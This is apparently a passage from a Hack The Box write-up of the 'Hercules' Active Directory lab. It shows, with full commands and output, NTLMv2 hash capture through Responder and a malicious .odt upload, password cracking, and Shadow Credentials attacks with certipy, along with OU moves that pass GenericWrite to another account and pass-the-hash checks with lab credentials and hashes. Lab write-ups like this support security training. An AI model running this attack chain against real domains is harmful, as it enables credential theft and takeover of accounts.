    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.15]
    Responder IPv6             [dead:beef:4::100d]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-YM5LTAAQLR9]
    Responder Domain Name      [Z6IW.LOCAL]
    Responder DCE-RPC Port     [45005]

[+] Listening for events...
```

Back on the `Report Submission` page, we'll try to upload the malicious `bad.odt` file.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021021745.png)

We can see the report went through fine since we get the confirmation message below. This confirms the email `web_admin` received about restricting the `File Upload` to admins only.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021021803.png)

Back on our terminal where `Responder` is listening, after a few minutes we receive the NTLMv2 hash for `HERCULES\natalie.a`. We'll save the hash to a file to try cracking it later.

```bash
❯ Responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.15]
    Responder IPv6             [dead:beef:4::100d]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-B58CRTKZXZW]
    Responder Domain Name      [0D2X.LOCAL]
    Responder DCE-RPC Port     [46178]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.242.196
[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:1122334455667788:485C0B81ECC336EF199F9E05408B9C09:010100000000000080555BD83042DC0138369D750E4400210000000002000800300044003200580001001E00570049004E002D004200350038004300520054004B005A0058005A00570004003400570049004E002D004200350038004300520054004B005A0058005A0057002E0030004400320058002E004C004F00430041004C000300140030004400320058002E004C004F00430041004C000500140030004400320058002E004C004F00430041004C000700080080555BD83042DC0106000400020000000800300030000000000000000000000000200000FAD4A2AABD34B1929999E18DDCB802426FD3A90B1F1355914F736EF9D90168010A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310035000000000000000000
```

Using tools like `Hashcat` or, in this case, `john`, we'll try to crack the `natalie.a` hash. From the results, we manage to break the hash and get that user's credentials in plaintext.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt natalie.a.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Prettyprincess123! (natalie.a)     
1g 0:00:00:22 DONE (2025-10-21 02:20) 0.04373g/s 468702p/s 468702c/s 468702C/s Q*66666..Praten123
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

We'll validate the credentials with `NetExec`, authenticating over Kerberos (`-k`) against LDAP. The result confirms the credentials are valid for this user.

```bash
❯ nxc ldap $IP -u 'natalie.a' -p 'Prettyprincess123!' -k
LDAP        10.129.90.250   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.90.250   389    DC               [+] hercules.htb\natalie.a:Prettyprincess123! 
```

We'll save these creds in our `credentials.txt` so we have them handy if we need them.

```bash
❯ echo -e 'ken.w:change*th1s_p@ssw()rd!!\natalie.a:Prettyprincess123!' > credentials.txt

❯ cat credentials.txt
ken.w:change*th1s_p@ssw()rd!!
natalie.a:Prettyprincess123!
```

Since NTLM auth is disabled, we'll request a TGT (Ticket Granting Ticket) for the user with tools like `getTGT.py` from the `Impacket` suite. Once we have our ticket (`.ccache`), we'll export it in the `KRB5CCNAME` variable so we can use it in our session. We'll verify with `klist` that the TGT loaded correctly.

```bash
❯ getTGT.py hercules.htb/natalie.a:'Prettyprincess123!' -dc-ip $IP
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in natalie.a.ccache

❯ export KRB5CCNAME=$(pwd)/natalie.a.ccache

❯ klist
Ticket cache: FILE:/root/Personal/HackTheBox/Labs/Windows/AD/Insane/Hercules/content/natalie.a.ccache
Default principal: natalie.a@HERCULES.HTB

Valid starting       Expires              Service principal
10/21/2025 03:14:53  10/21/2025 13:14:53  krbtgt/HERCULES.HTB@HERCULES.HTB
	renew until 10/22/2025 03:14:53
```

---
## Auth as bob.w

### BloodHound enumeration finding new attack vectors

At this point, we'll run an enumeration through `BloodHound` to try to find new attack vectors. As a collector we'll use [rusthound-ce](https://github.com/g0h4n/RustHound-CE), which gives us a lot more info than the other collectors, and it's also quite fast at collecting the data we need to upload.

> **BloodHound** is an essential tool in Active Directory audits, designed to map trust relationships and potential attack paths within a domain. It lets you analyze how an attacker could move laterally or escalate privileges by abusing already-existing relationships between domain objects.
{: .prompt-info }

```bash
❯ rusthound-ce -d hercules.htb -u 'natalie.a' -k -f DC.hercules.htb -i $IP -c All -z --ldaps
---------------------------------------------------
Initializing RustHound-CE at 03:15:28 on 10/21/25
Powered by @g0h4n_0
Special thanks to NH-RED-TEAM
---------------------------------------------------

[2025-10-21T01:15:28Z INFO  rusthound_ce] Verbosity level: Info
[2025-10-21T01:15:28Z INFO  rusthound_ce] Collection method: All
[2025-10-21T01:15:29Z INFO  rusthound_ce::ldap] Connected to HERCULES.HTB Active Directory!
[2025-10-21T01:15:29Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-10-21T01:15:29Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-21T01:15:29Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=hercules,DC=htb
[2025-10-21T01:15:29Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-21T01:15:30Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=hercules,DC=htb
[2025-10-21T01:15:30Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-21T01:15:31Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hercules,DC=htb
[2025-10-21T01:15:31Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-21T01:15:31Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hercules,DC=htb
[2025-10-21T01:15:31Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-21T01:15:32Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hercules,DC=htb
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::parser] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 12%                                                                                                                                                                                                              [2025-10-21T01:15:32Z INFO  rusthound_ce::objects::enterpriseca] Found 18 enabled certificate templates
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::parser] Parsing LDAP objects finished!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 49 users parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 9 ous parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2025-10-21T01:15:32Z INFO  rusthound_ce::json::maker::common] .//20251021031532_hercules-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 03:15:32 on 10/21/25! Happy Graphing!
```

Going over `natalie.a`'s permissions on the rest of the domain objects, we find the path below. In the graph we can see the user is a member of a group called `WEB SUPPORT`, whose members have `GenericWrite` over an OU (Organizational Unit) and over several users we could try to move laterally to in order to gain more access inside the domain. We also confirm these 6 users sit in the `WEB DEPARTMENT` OU.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021040607.png)

On top of that, checking the query `Shortest Path to Domain Admins` BloodHound offers, we find the following path to reach Domain Admins in the domain. Along the path we can see several users that belong to the `HELPDESK ADMINISTRATORS` group and one user from the `SERVICE OPERATORS` group who can reset `IIS_WEBSERVER$`'s credentials. Once we get access as that user, we could try a `Resource-based Constrained Delegation (RBCD)` attack since it has the `AllowedToAct` permission over the Domain Controller - `DC.HERCULES.HTB`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021040901.png)

We also check that two users sit in the `REMOTE MANAGEMENT USERS` group, maybe one of them is who we need to reach first to grab the `user.txt` flag.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021042816.png)

Going through the 6 users in the `WEB DEPARTMENT` OU, we see `bob.w` is the only one that's a member of an extra group on top of the rest, called `RECRUITMENT MANAGERS`, which catches our eye at a glance. So the first user we'll try to get credentials for is `bob.w`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021041137.png)

---
### Abusing GenericWrite privileges to perform Shadow Credentials Attack

As we mentioned earlier, `natalie.a` is a member of the `WEB SUPPORT` group, whose members have the `GenericWrite` privilege over the target user.

- [https://www.hackingarticles.in/genericwrite-active-directory-abuse/](https://www.hackingarticles.in/genericwrite-active-directory-abuse/)
- [https://gzzcoo.gitbook.io/pentest-notes/active-directory-pentesting/abusing-active-directory-acls-aces/genericwrite](https://gzzcoo.gitbook.io/pentest-notes/active-directory-pentesting/abusing-active-directory-acls-aces/genericwrite)

> `GenericWrite` in Active Directory lets a user modify every modifiable attribute of an object, except properties that need special permissions, like resetting passwords.
>
> If an attacker gets `GenericWrite` over a user, they can write to the `servicePrincipalNames` attribute and immediately kick off a targeted `Kerberoasting` attack. Also, having `GenericWrite` over a group lets you drop your own account, or one you control, straight into that group, which is an effective privilege escalation. Alternatively, if the attacker gets `GenericWrite` over an object, they can modify the `msds-KeyCredentialLink` attribute. As a result, they create `Shadow Credentials` and authenticate as that computer account using Kerberos PKINIT.
>
> Info via: [Hacking Articles](https://www.hackingarticles.in/genericwrite-active-directory-abuse/)
{: .prompt-info }

![image](/assets/img/writeups/htb-hercules/Pasted image 20251022033620.png)

In this case we go with a `Shadow Credentials Attack` to recover the target user's NTLM hash and later authenticate as that user with techniques like **Pass-the-Hash (PtH)**.

From the results we manage to get a TGT (Ticket Granting Ticket) in the `bob.w.ccache` file for the target user, and we also recover his NTLM hash.

> The attack known as `Shadow Credentials` lets an attacker get persistent access to an Active Directory account (user or machine) without knowing its password or hash. To do that, it abuses the little-known attribute `msDS-KeyCredentialLink`, introduced with Windows Server 2016.
>
>This attribute can store public keys tied to an account for authentication via `Kerberos PKINIT`, a method that swaps passwords for asymmetric cryptography (public/private key).
>
> If an attacker has permissions like `WriteProperty`, `GenericWrite` or `GenericAll` on that attribute for a target account, they can inject their own public key. Then they can authenticate as that user using `PKINIT` and their private key, getting a valid TGT without needing passwords or prior tickets.
{: .prompt-info }

```bash
❯ certipy shadow auto -username 'natalie.a@hercules.htb' -k -no-pass -account 'bob.w' -dc-ip $IP -dc-host DC -target DC.hercules.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'bob.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '818b3e03f83c4bfa8021ee538a85de89'
[*] Adding Key Credential with device ID '818b3e03f83c4bfa8021ee538a85de89' to the Key Credentials for 'bob.w'
[*] Successfully added Key Credential with device ID '818b3e03f83c4bfa8021ee538a85de89' to the Key Credentials for 'bob.w'
[*] Authenticating as 'bob.w' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'bob.w@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bob.w.ccache'
[*] Wrote credential cache to 'bob.w.ccache'
[*] Trying to retrieve NT hash for 'bob.w'
[*] Restoring the old Key Credentials for 'bob.w'
[*] Successfully restored the old Key Credentials for 'bob.w'
[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
```

We'll validate via `NetExec` with a `Pass-the-Hash(PtH)` using `bob.w@hercules.htb`'s NTLM hash. From the result we confirm the auth is valid for these new credentials, so we can now act as `bob.w` in the `hercules.htb` domain.

```bash
❯ nxc ldap $IP -u 'bob.w' -H '8a65c74e8f0073babbfac6725c66cc3f' -k
LDAP        10.129.90.250   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.90.250   389    DC               [+] hercules.htb\bob.w:8a65c74e8f0073babbfac6725c66cc3f 
```

When `certipy` runs the `Shadow Credentials Attack`, it also drops a TGT in a file (`.ccache`) which we'll export into the `KRB5CCNAME` variable and confirm with `klist` that the TGT imported correctly into our session.

```bash
❯ export KRB5CCNAME=$(pwd)/bob.w.ccache

❯ klist
Ticket cache: FILE:/root/Personal/HackTheBox/Labs/Windows/AD/Insane/Hercules/content/bob.w.ccache
Default principal: bob.w@HERCULES.HTB

Valid starting       Expires              Service principal
10/21/2025 04:15:07  10/21/2025 14:15:07  krbtgt/HERCULES.HTB@HERCULES.HTB
	renew until 10/22/2025 04:15:07
```

---
## Shell as auditor

### bloodyAD Enumeration (Writable and nTSecurityDescriptor)

Using `bloodyAD` as `bob.w`, we'll check which attributes we have `WRITE` capability over on different domain objects. From the output we can see we have several permissions over 3 OUs (`Engineering Department`, `Security Department` and `Web Department`), and over the `Name` and `CN` fields of several users, including `auditor`.

```bash
❯ bloodyAD --host dc.hercules.htb -d hercules.htb -k get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
...[snip]---

distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
...[snip]---

distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
...[snip]---

distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

...[snip]---

distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
...[snip]---
```

On the `bloodyAD` GitHub page we find the blog [Access Control - SD Resolving](https://github.com/CravateRouge/bloodyAD/wiki/Access-Control), where, through the `--resolve-sd` flag, we can resolve the permissions tied to a security descriptor. With this we get a human-readable set of permissions where we can check permissions over an object in a much more detailed way, things `BloodHound` can't show.

> Remember `bob.w` is a member of the `RECRUITMENT MANAGERS` group.
{: .prompt-info }

- Reviewing the `securityDescriptor` over the `auditor` user

	- From the output we can see the `RECRUITMENT MANAGERS` group has the `WRITE_PROP` permission over the `RDN (Relative Distinguished Name)` and the `CN (Common Name)` of the `auditor` user.

```bash
❯ bloodyAD --host dc.hercules.htb -d hercules.htb -k get object 'CN=AUDITOR,OU=SECURITY DEPARTMENT,OU=DCHERCULES,DC=HERCULES,DC=HTB' --resolve-sd

distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
...[snip]...
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: Recruitment Managers
nTSecurityDescriptor.ACL.11.Right: WRITE_PROP
nTSecurityDescriptor.ACL.11.ObjectType: RDN; Common-Name
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERITED
...[snip]...
name: Auditor
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hercules,DC=htb
objectClass: top; person; organizationalPerson; user
objectGUID: ff7c304b-17ac-4ba5-af84-e3202bed4ccc
objectSid: S-1-5-21-1889966460-2597381952-958560702-1128
primaryGroupID: 513
pwdLastSet: 2024-12-04 01:44:44.206920+00:00
sAMAccountName: auditor
sAMAccountType: 805306368
telephoneNumber: +61 420-465-783
uSNChanged: 124306
uSNCreated: 13036
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: auditor@hercules.htb
whenChanged: 2025-10-21 02:22:11+00:00
whenCreated: 2024-12-04 01:44:44+00:00
```

- Reviewing the `securityDescriptor` over the `SECURITY DEPARTMENT` OU where the `auditor` user is

	- The `RECRUITMENT MANAGERS` members have the `WRITE_PROP` permission over the `RDN` and `Common-Name` fields of the objects inside the container, because it has the `CONTAINER_INHERIT` flag and this ACE is inherited.
	
	- We also have `DELETE_CHILD` and `CREATE_CHILD`, i.e. we can create/delete objects inside the container (or move them if we have the required permissions on the destination OU).

```bash
❯ bloodyAD --host dc.hercules.htb -d hercules.htb -k get object 'OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb' --resolve-sd

distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
...[snip]...
nTSecurityDescriptor.ACL.1.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.1.Trustee: Recruitment Managers
nTSecurityDescriptor.ACL.1.Right: WRITE_PROP
nTSecurityDescriptor.ACL.1.ObjectType: RDN; Common-Name
nTSecurityDescriptor.ACL.1.Flags: CONTAINER_INHERIT
...[snip]...
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: Recruitment Managers
nTSecurityDescriptor.ACL.4.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.4.ObjectType: Self
```

- Reviewing the `securityDescriptor` over the `WEB DEPARTMENT` OU where `natalie.a` has `GenericWrite` over that unit.

	- The `RECRUITMENT MANAGERS` members have the `WRITE_PROP` permission over the `RDN` and `Common-Name` fields of the objects inside the container, because it has the `CONTAINER_INHERIT` flag and this ACE is inherited.
	
	- We also have `DELETE_CHILD` and `CREATE_CHILD`, i.e. we can create/delete objects inside the container (or move them if we have the required permissions on the destination OU).
	
	- The `WEB SUPPORT` members have `GENERIC_WRITE` with the `CONTAINER_INHERIT` and `INHERIT_ONLY` flags, meaning members of that group will automatically get `GENERIC_WRITE` over the container's child objects.

```bash
❯ bloodyAD --host dc.hercules.htb -d hercules.htb -k get object 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb' --resolve-sd

distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
...[snip]...
nTSecurityDescriptor.ACL.0.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.0.Trustee: Recruitment Managers
nTSecurityDescriptor.ACL.0.Right: WRITE_PROP
nTSecurityDescriptor.ACL.0.ObjectType: RDN; Common-Name
nTSecurityDescriptor.ACL.0.Flags: CONTAINER_INHERIT
...[snip]...
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: Recruitment Managers
nTSecurityDescriptor.ACL.3.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Self
---[snip]...
nTSecurityDescriptor.ACL.5.Trustee: Web Support
nTSecurityDescriptor.ACL.5.Right: GENERIC_WRITE
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.5.Flags: CONTAINER_INHERIT; INHERIT_ONLY; NO_PROPAGATE_INHERIT
```

---
### Moving Users Between OUs via CREATE_CHILD/DELETE_CHILD Permissions

With this scenario in mind, here's the goal we're going for:

- Re-request the TGT as `bob.w`.

- Move the `auditor` user, currently in the `SECURITY DEPARTMENT` OU (where we can create/delete objects), to the `WEB DEPARTMENT` OU (where we can also create/delete objects) and where `WEB SUPPORT` members automatically get the `GENERIC_WRITE` permission.

- Request the TGT for `natalie.a`, a member of `WEB SUPPORT`, who'll get `GENERIC_WRITE` over `auditor`.

- Through `natalie.a`, run a `Shadow Credentials` over the `auditor` user, since he now sits in `WEB DEPARTMENT`, where `natalie.a` inherits this permission over the container's child objects.

- Once we have his credentials and TGT, we'll connect to the box over `WinRM`.

We'll connect as `bob.w` with `PowerView.py` (the Python version of the well-known `PowerView.ps1`). This version gives us a pseudo-console where we can interact with the domain over LDAP/LDAPS, meaning we don't get an actual console on the box, it's just an interface to run commands pretty similar to the `PowerView` ones in a quite intuitive way.

With the first command `Get-DomainObject`, we'll check the `auditor` user's `distinguishedName`, which we confirm is inside `SECURITY DEPARTMENT`.

Our goal is to change the `distinguishedName (DN)` of `auditor` so he ends up in `WEB DEPARTMENT`. We confirm that via `Set-DomainObjectDN` we manage to modify the attribute, and checking again we see the change went through.

> A [Distinguished Name (DN)](https://www.google.com/search?client=firefox-b-e&sca_esv=d915882ffb3cd600&channel=entpr&cs=1&sxsrf=AE3TifPKXNBsCOQPwWvihFsE_rbSGbo0Og%3A1761231990386&q=Nombre+Distinguido+%28DN%29&sa=X&ved=2ahUKEwju7PO4zLqQAxX4m_0HHXAQIO8QxccNegQIAhAB&mstk=AUtExfBp2_dxFVx6XGmOvaKjdY5Ev4NyJuOjuDc8JGxJsZUlS0s9plQhv6D1Rz-e3v4hPlp3_Op6h619IrmAIcI8Mze2xqEcn4Umiu5kFfJmrFqxQDo42u8pYfF2cm2sx4YrkCll1vsX7h9_GmZrAFcl-kTWnYXARvToUwX_kctsryITvQKr319twQhO45i7PpPEizbj1YP63xwHZWFmWXbZYDQhB95jpshrwdjgCsjpxTi5a7x-hfi-D365PiYiF8RhzBHGOpW7yIFza1HFfHDvukwr&csui=3) is a text string that uniquely identifies an entry inside a directory, like LDAP or Active Directory directories, or a digital certificate. It's made up of a series of attributes describing the entry's hierarchical path, including info like the common name (CN), organizational unit (OU) and country (C).
{: .prompt-info }

```powershell
❯ powerview hercules.htb/bob.w@dc.hercules.htb --dc-ip $IP -ns dc.hercules.htb -k --no-pass
Logging directory is set to /root/.powerview/logs/hercules-bob.w-dc.hercules.htb

╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─PV ❯ Get-DomainObject -Identity auditor -Properties distinguishedName -NoCache
distinguishedName     : CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb

╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─PV ❯ Set-DomainObjectDN -Identity auditor -DestinationDN 'OU=WEB DEPARTMENT,OU=DCHERCULES,DC=HERCULES,DC=HTB'
[2025-10-21 04:50:07] [Set-DomainObject] Success! modified new dn for CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb

╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─PV ❯ Get-DomainObject -Identity auditor -Properties distinguishedName -NoCache
distinguishedName     : CN=Auditor,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
```

---
### Abusing GenericWrite inheritance Privilege over a OU to perform Shadow Credentials

Remember `WEB SUPPORT`, whose member is `natalie.a`, has `GENERIC_WRITE` over this OU with the `CONTAINER_INHERIT` flag. That means now that `auditor`'s `distinguishedName` sits in `WEB DEPARTMENT`, we'll inherit these permissions over him too.

```bash
distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
...[snip]...
nTSecurityDescriptor.ACL.5.Trustee: Web Support
nTSecurityDescriptor.ACL.5.Right: GENERIC_WRITE
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.5.Flags: CONTAINER_INHERIT; INHERIT_ONLY; NO_PROPAGATE_INHERIT
```

We'll request a new TGT (Ticket Granting Ticket) for `natalie.a` and export it in the `KRB5CCNAME` variable. Once we have the TGT (`.ccache`) in our session, we'll run the `Shadow Credentials` attack over `auditor`, since we currently hold the needed permissions.

From the result we confirm we got his NTLM hash and his TGT (`.ccache`), which we can use to authenticate in the domain under `auditor@hercules.htb`'s context.

```bash
❯ getTGT.py hercules.htb/natalie.a:'Prettyprincess123!' -dc-ip $IP
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in natalie.a.ccache

❯ export KRB5CCNAME=$(pwd)/natalie.a.ccache

❯ certipy shadow auto -username 'natalie.a@hercules.htb' -k -no-pass -account 'auditor' -dc-ip $IP -dc-host DC -target DC.hercules.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'auditor'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '51161d32c17a4a188cf486f56ea2bc59'
[*] Adding Key Credential with device ID '51161d32c17a4a188cf486f56ea2bc59' to the Key Credentials for 'auditor'
[*] Successfully added Key Credential with device ID '51161d32c17a4a188cf486f56ea2bc59' to the Key Credentials for 'auditor'
[*] Authenticating as 'auditor' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'auditor@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'auditor.ccache'
[*] Wrote credential cache to 'auditor.ccache'
[*] Trying to retrieve NT hash for 'auditor'
[*] Restoring the old Key Credentials for 'auditor'
[*] Successfully restored the old Key Credentials for 'auditor'
[*] NT hash for 'auditor': a9285c625af80519ad784729655ff325
```

We'll validate `auditor`'s credentials with `NetExec` against LDAP. The credentials check out and we're now under the `hercules\auditor` context.

```bash
❯ nxc ldap $IP -u 'auditor' -H 'a9285c625af80519ad784729655ff325' -k
LDAP        10.129.90.250   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.90.250   389    DC               [+] hercules.htb\auditor:a9285c625af80519ad784729655ff325
```

From the `certipy` attack, the tool also hands us his TGT (`.ccache`) directly, which we'll export with the `KRB5CCNAME` variable and verify with `klist`.

```bash
❯ export KRB5CCNAME=$(pwd)/auditor.ccache

❯ klist
Ticket cache: FILE:/root/Personal/HackTheBox/Labs/Windows/AD/Insane/Hercules/content/auditor.ccache
Default principal: auditor@HERCULES.HTB

Valid starting       Expires              Service principal
10/21/2025 20:49:00  10/22/2025 06:49:00  krbtgt/HERCULES.HTB@HERCULES.HTB
	renew until 10/22/2025 20:49:00
```

---
### WinRMExec to obtain a shell in WinRM SSL (port 5986)

